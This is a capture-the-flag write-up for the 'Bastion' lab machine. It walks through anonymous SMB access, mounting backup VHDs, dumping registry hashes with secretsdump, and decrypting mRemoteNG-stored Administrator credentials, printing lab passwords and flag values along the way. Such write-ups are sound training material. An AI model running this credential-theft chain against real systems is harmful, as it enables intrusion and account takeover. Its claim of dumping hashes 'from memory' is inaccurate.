
## CTF Writeup: Bastion

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.136.29
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-19 08:48 -0500
Stats: 0:01:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 08:51 (0:00:55 remaining)
Nmap scan report for 10.129.136.29
Host is up (0.031s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-19T15:50:41+02:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-19T13:50:38
|_  start_date: 2026-09-19T13:46:57
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.05 seconds
```

The target seems very outdated. It's running Windows Server 2016, if it has no LTS, it could be vulnerable to EternalBlue.

Before investigating this I decided to enumerate SMB Shares anonymously and it worked. We found one non-default SMB Share named "Backups". This looks rather interesting!

```
smbclient -L \\\\10.129.136.29
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.136.29 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

It wasn't possible to enumerate if we have write permissions using nxc or smbmap, so I decided to just try & connect anonymously to the SMB Share and it worked!

```
smbclient \\\\10.129.136.29/Backups   
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \>
```

We were able to find an interesting "L4mpje-PC" Directory. This hints at an username! Also in the Directory was an Backup Directory which has multiple .vhd files. Let's download them locally!

The issue was that the .vhd files were poorly downloaded since the company VPN was quiet instable. So I decided to just mount the whole smb share onto my local machine instead of downloading it.

```
mount -t cifs //10.129.136.29/backups /mnt -o user=,password=
```

Created an /mnt/vhd directory.

```
mkdir /mnt/vhd
```

I then navigated into my /mnt directory and utilized "guestmount" to mount the virtualdisks onto my local machine.

The second .vhd file worked.

```
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
```

Since we now got access to the entire filesystem we can simply dump all hashes from memory. Let's do it, but before we'll need to move the SAM, SYSTEM & SECURITY file out of read-only mounted directory.

```
cp SAM SYSTEM SECURITY /ctfs/htb/windows/bastion
```

Dumped all credentials from memory.

```
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```

There was an stored cached password.

```
L4mpje:bureaulampje
```

Connected to the target server using SSH and the retrieved credentials.

```
ssh L4mpje@10.129.136.29
```

Retrieved user.txt in C:\Users\L4mpje\Desktop.

```
b8988691becca2d11dc35cb9b5cc193b
```
## Privilege Escalation

I found an running mRemoteNG Application which is an remote management tool which allows users to store credentials for many connections.

The Priv Esc is very simple. We can find an interesting config file in which there is credentials stored, including an encoded password.

```
C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
```

This gave us a lot of information. The password of the Administrator User is encrypted with AES. 

We can utilize an tool called mremoteng_decrypt.py which we can get from GitHub

```
git clone https://github.com/kmahyyg/mremoteng-decrypt.git
```

Downloaded the necessary config file onto local machine using scp.

```
scp 'L4mpje@10.129.136.29:C:/Users/L4mpje/appData/Roaming/mRemoteNG/confCons.xml' .
```

Ran the decryptor and gained credentials.

```
python3 mremoteng_decrypt.py -rf /ctfs/htb/windows/bastion/confCons.xml 
Username: Administrator
Hostname: 127.0.0.1
Password: thXLHM96BeKL0ER2 

Username: L4mpje
Hostname: 192.168.1.75
Password: bureaulampje
```

Connected to the target server as "Administrator" user.

```
ssh Administrator@10.129.136.29
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
32a933252ec18dd4159b2ae084d7a242
```